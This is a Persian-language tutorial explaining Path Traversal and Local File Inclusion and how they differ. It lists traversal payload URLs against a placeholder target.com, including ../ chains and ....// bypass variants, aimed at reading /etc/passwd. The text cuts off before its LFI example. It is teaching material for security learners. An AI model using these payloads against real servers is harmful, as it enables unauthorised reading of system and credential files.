# Path-Travel-or-Directory-Traversal-AND-Local-File-Inclusion-LFI-


- آسیب‌پذیری‌های **Path Traversal** (یا **Directory Traversal**) و **Local File Inclusion (LFI)** به هم مربوط هستند، ولی تفاوت‌های مهمی دارند.

## **Path Traversal:**

### **Path Traversal** (دسترسی به مسیر یا پیمودن دایرکتوری):
- در این نوع آسیب‌پذیری، مهاجم می‌تواند مسیر فایل‌ها را دستکاری کند تا به فایل‌ها یا دایرکتوری‌هایی که خارج از دایرکتوری‌های مجاز هستند دسترسی پیدا کند. مثلا، مهاجم می‌تواند با استفاده از `../` به فایل‌های حساس (مثل `/etc/passwd` در سیستم‌های مبتنی بر Linux) دسترسی پیدا کند. این آسیب‌پذیری فقط امکان دیدن محتوای فایل‌ها را می‌دهد و شامل اجرای آن‌ها نیست.
- چطور پیدا کنیم؟
    - فرض کنید یک URL به این صورت را می‌بینیم:

    ```yaml
    https://target.com/vocational/download.php?filename=wjdncjwnjdekcnwdc.pdf
    ```

    حالا شما می‌آیید با استفاده از `/etc/passwd` شروع می‌کنید به گشتن:

    ```yaml
    https://target.com/vocational/download.php?filename=/etc/passwd
    ```

    حالا که پیدا نشد باید با استفاده از `../` بیایم مراحل زیر را بریم:

    ```yaml
    https://target.com/vocational/download.php?filename=/etc/passwd
    https://target.com/vocational/download.php?filename=../etc/passwd
    https://target.com/vocational/download.php?filename=../../etc/passwd
    https://target.com/vocational/download.php?filename=../../../etc/passwd
    https://target.com/vocational/download.php?filename=../../../../etc/passwd
    https://target.com/vocational/download.php?filename=../../../../../etc/passwd
    https://target.com/vocational/download.php?filename=../../../../../../etc/passwd
    https://target.com/vocational/download.php?filename=../../../../../../../etc/passwd
    Or
    https://target.com/vocational/download.php?filename=....//etc//passwd
    https://target.com/vocational/download.php?filename=....//....//etc/passwd
    https://target.com/vocational/download.php?filename=....//....//....//etc/passwd
    https://target.com/vocational/download.php?filename=....//....//....//....//etc/passwd
    Or
    https://target.com/vocational/download.php?filename=../etc/passwd.pdf
    https://target.com/vocational/download.php?filename=../../../etc/passwd.pdf
    and ...
    ```

### **Local File Inclusion (LFI)** (گنجاندن فایل محلی):
- در آسیب‌پذیری LFI، مهاجم می‌تواند فایل‌های موجود در سیستم را در چارچوب اجرای برنامه شامل کند. مثلا، اگر ورودی کاربر بدون فیلتر به عنوان مسیر فایل استفاده شود، مهاجم می‌تواند فایل‌های حساس یا حتی فایل‌هایی که کد اجرایی دارند را در برنامه لود کند. این امر می‌تواند به اجرای کد مخرب در سیستم منجر شود.

## **تفاوت و شباهت‌ها:**
- **Path Traversal** و **LFI** هر دو به دستکاری در مسیر فایل‌ها وابسته هستند، ولی LFI به طور خاص شامل **گنجاندن و احتمالا اجرای فایل‌ها** است، در حالی که Path Traversal فقط برای **دیدن محتوای فایل‌ها** است.
- **Path Traversal** معمولاً به دیدن محتوای محدود می‌شود، ولی **LFI** می‌تواند به اجرای کد مخرب منجر شود، به خصوص اگر فایل‌های محلی کد اجرایی داشته باشند.

## به طور خلاصه:
- **Path Traversal**: برای دیدن محتوای فایل‌های حساس.
- **LFI**: برای گنجاندن و احتمالا اجرای فایل‌های محلی در چارچوب برنامه که می‌تواند خطرات بیشتری مثل اجرای کد مخرب داشته باشد.

## در اینجا مثالی می‌آورم که تفاوت بین **Local File Inclusion (LFI)** و **Path Traversal** را نشان دهد:

### **مثال LFI:**

فرض کنید که یک وب‌سایت پارامتری به نام `file` را دریافت می‌کند که فایل‌های موجود در سرور را در صفحه نمایش می‌دهد. مثلا:

